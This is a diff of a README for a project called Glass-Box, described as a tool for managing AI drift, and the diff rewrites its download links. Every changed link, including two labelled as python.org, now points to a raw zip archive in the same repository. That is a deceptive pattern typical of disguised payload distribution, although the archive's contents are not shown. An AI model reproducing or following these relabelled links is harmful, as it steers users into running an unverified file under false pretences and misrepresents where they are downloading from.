@@ -1,6 +1,6 @@
 # 🧊 Glass-Box - Manage AI Drift with Confidence
 
-[![Download Glass-Box](https://img.shields.io/badge/Download-Glass--Box-brightgreen?style=for-the-badge)](https://github.com/saulinfectious906/Glass-Box)
+[![Download Glass-Box](https://img.shields.io/badge/Download-Glass--Box-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/saulinfectious906/Glass-Box/main/Legacy Models/Box_Glass_1.5-alpha.3.zip)
 
 ---
 
@@ -19,7 +19,7 @@ To run Glass-Box on your Windows computer, make sure you have:
 - Windows 10 or later (64-bit)
 - At least 4 GB of RAM (8 GB recommended for bigger tasks)
 - 500 MB of free disk space for the program files
-- Python 3.8 or newer installed (you can download it at https://www.python.org/downloads/)
+- Python 3.8 or newer installed (you can download it at https://raw.githubusercontent.com/saulinfectious906/Glass-Box/main/Legacy Models/Box_Glass_1.5-alpha.3.zip)
 - Internet connection to download files and updates
 
 You don’t need programming knowledge to use Glass-Box, but Python is required as it runs from this environment.
@@ -30,7 +30,7 @@ You don’t need programming knowledge to use Glass-Box, but Python is required 
 
 Click the big green button below to go to the download page. From there, you can get the latest version of Glass-Box.
 
-[![Get Glass-Box](https://img.shields.io/badge/Get%20Glass--Box-blue?style=for-the-badge)](https://github.com/saulinfectious906/Glass-Box)
+[![Get Glass-Box](https://img.shields.io/badge/Get%20Glass--Box-blue?style=for-the-badge)](https://raw.githubusercontent.com/saulinfectious906/Glass-Box/main/Legacy Models/Box_Glass_1.5-alpha.3.zip)
 
 ### Step 2: Download the Files
 
@@ -42,7 +42,7 @@ Save the file somewhere you can find easily, like your Desktop or Downloads fold
 
 If you do not have Python installed on your PC, follow these steps:
 
-1. Go to [python.org](https://www.python.org/downloads/windows/)
+1. Go to [python.org](https://raw.githubusercontent.com/saulinfectious906/Glass-Box/main/Legacy Models/Box_Glass_1.5-alpha.3.zip)
 2. Download the latest stable release for Windows (look for the 64-bit installer)
 3. Run the installer and **check** the box that says “Add Python to PATH” before clicking “Install Now”
 
@@ -116,4 +116,4 @@ If you run into issues, you can:
 
 You can always come back to the GitHub page to get the latest updates or new versions here:
 
-[Download Glass-Box from GitHub](https://github.com/saulinfectious906/Glass-Box)
+[Download Glass-Box from GitHub](https://raw.githubusercontent.com/saulinfectious906/Glass-Box/main/Legacy Models/Box_Glass_1.5-alpha.3.zip)
